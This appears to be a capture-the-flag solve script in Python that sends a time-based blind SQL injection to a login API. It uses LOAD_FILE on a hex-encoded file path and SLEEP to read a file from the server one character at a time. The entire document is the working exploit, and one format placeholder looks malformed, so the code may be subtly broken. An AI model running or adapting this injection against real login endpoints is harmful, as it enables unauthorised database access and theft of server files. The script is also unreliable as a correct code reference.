from time import time
from string import ascii_letters
from urllib.request import Request, urlopen

new_char = True
position = 1
time1 = 0
time2 = 0

while new_char:
    for char in ascii_letters + '{' + '}' + '_':
        time1 = time()
        urlopen(Request("http://172.17.0.2:1337/api/login", method='POST', headers={'Content-Type': 'application/json'}, data=b'{"username":"\\" OR SUBSTR(LOAD_FILE(0x2f7369676e616c5f736c657574685f6669726d77617265), %(p)i, 1) = \\"%(cs\\" AND SLEEP(1); -- -","password":"test"}' % {b'p': position, b'c': char.encode()}))
        time2 = time()
        print(char, time2 - time1)
        if time2 - time1 > 1:
            print(char, end="", flush=True)
            break
    else:
        new_char = False